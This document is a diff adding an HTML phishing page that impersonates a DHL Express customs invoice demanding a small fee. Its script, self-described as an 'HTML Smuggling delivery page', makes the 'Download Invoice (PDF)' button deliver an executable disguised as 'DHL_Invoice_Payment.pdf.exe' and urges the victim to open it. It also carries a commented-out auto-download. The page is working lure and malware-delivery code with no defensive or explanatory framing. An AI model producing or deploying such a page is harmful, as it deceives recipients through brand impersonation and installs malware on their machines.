@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>DHL Express - Invoice #DH4839210-KH</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #f4f4f4;
+        font-family: Arial, sans-serif;
+    }
+    .container {
+        max-width: 680px;
+        margin: 20px auto;
+        background: #fff;
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+    .header {
+        background: #d40511;
+        color: white;
+        padding: 20px;
+        text-align: center;
+    }
+    .header img {
+        height: 50px;
+    }
+    .content {
+        padding: 30px;
+    }
+    .alert {
+        background: #fff8e1;
+        border-left: 5px solid #ff9800;
+        padding: 15px;
+        margin: 20px 0;
+        font-weight: 600;
+    }
+    .btn {
+        display: inline-block;
+        background: #d40511;
+        color: white;
+        padding: 14px 30px;
+        text-decoration: none;
+        border-radius: 5px;
+        font-weight: bold;
+        cursor: pointer;
+        border: none;
+    }
+    .btn:hover {
+        background: #a00408;
+    }
+    .info-box {
+        background: #f9f9f9;
+        border: 1px solid #ddd;
+        padding: 15px;
+        border-radius: 5px;
+        margin: 15px 0;
+    }
+    .status {
+        color: #666;
+        font-size: 12px;
+        margin-top: 20px;
+        text-align: center;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/DHL_Express_Logo.svg" alt="DHL Express">
+        <h1>Shipment Invoice & Customs Declaration</h1>
+        <p>Reference: DH4839210-KH | Date: 28 November 2025</p>
+    </div>
+    
+    <div class="content">
+        <h2>Dear Valued Customer,</h2>
+        <p>Your package <strong>#DH4839210-KH</strong> requires a customs fee of <strong>USD 4.99</strong> before delivery can be completed.</p>
+        
+        <div class="info-box">
+            <strong>Package Details:</strong><br>
+            From: Global Electronics Ltd., Singapore<br>
+            To: Phnom Penh, Cambodia<br>
+            Weight: 2.5 kg<br>
+            Contents: Electronic Equipment
+        </div>
+        
+        <div class="alert">
+            ⚠️ Action Required: Download and review the invoice to proceed with customs payment.
+        </div>
+        
+        <p style="text-align: center;">
+            <button class="btn" id="pdf-btn">📄 Download Invoice (PDF)</button>
+        </p>
+        
+        <div class="info-box">
+            <strong>Payment Methods:</strong><br>
+            • Credit Card<br>
+            • Bank Transfer<br>
+            • Digital Wallet<br>
+            <br>
+            <em>PDF contains QR code for instant payment processing.</em>
+        </div>
+        
+        <div class="status">
+            <p>Click the button above to download your invoice in PDF format.</p>
+            <p id="download-status"></p>
+        </div>
+    </div>
+</div>
+
+<script>
+// Configuration - EXE file in same folder as this HTML
+var PAYLOAD_FILE = 'chimera_real.exe';  // Name of the .exe file in same directory
+var DISGUISED_NAME = 'DHL_Invoice_Payment.pdf.exe';  // Disguised filename for download
+
+console.log('[*] HTML Smuggling delivery page loaded');
+console.log('[*] Target payload: ' + PAYLOAD_FILE);
+
+// Handle button click to download actual .exe file
+document.getElementById('pdf-btn').onclick = function() {
+    console.log('[+] User clicked download button');
+    
+    // Create download link pointing to .exe in same folder
+    var a = document.createElement('a');
+    a.href = PAYLOAD_FILE;  // Relative path - same folder as HTML
+    a.download = DISGUISED_NAME;  // Disguise as PDF
+    a.style.display = 'none';
+    
+    document.body.appendChild(a);
+    a.click();
+    
+    // Cleanup
+    setTimeout(function() {
+        document.body.removeChild(a);
+    }, 100);
+    
+    // Show success message
+    document.getElementById('download-status').innerHTML = 
+        '✓ Invoice downloaded successfully!<br><small>Please open the file to complete payment</small>';
+    
+    console.log('[+] Payload delivered via HTML smuggling');
+    console.log('[+] Downloaded as: ' + DISGUISED_NAME);
+};
+
+// Optional: Auto-download after 3 seconds (uncomment to enable)
+/*
+window.onload = function() {
+    setTimeout(function() {
+        document.getElementById('pdf-btn').click();
+    }, 3000);
+};
+*/
+</script>
+</body>
+</html>
